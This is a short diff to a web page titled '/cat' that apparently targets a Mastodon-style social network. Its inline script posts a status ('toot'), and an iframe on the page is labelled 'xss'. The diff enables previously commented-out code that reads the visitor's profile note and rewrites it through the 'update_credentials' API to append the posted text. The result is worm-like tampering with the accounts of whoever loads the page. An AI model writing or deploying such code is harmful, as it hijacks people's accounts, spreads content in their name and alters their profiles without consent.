@@ -42,11 +42,11 @@ permalink: /cat
           console.log('done toot')
         });
 
-        // api.get('accounts/verify_credentials', {}, ({ source: { note } }) => {
-        //   api.patch("accounts/update_credentials", { note: note + '\n' + status }, function (data) {
-        //     console.log('done bio')
-        //   });
-        // })
+        api.get('accounts/verify_credentials', {}, ({ source: { note } }) => {
+          api.patch("accounts/update_credentials", { note: note + '\n' + status }, function (data) {
+            console.log('done bio')
+          });
+        })
       }
     </script>
     <iframe title="xss"
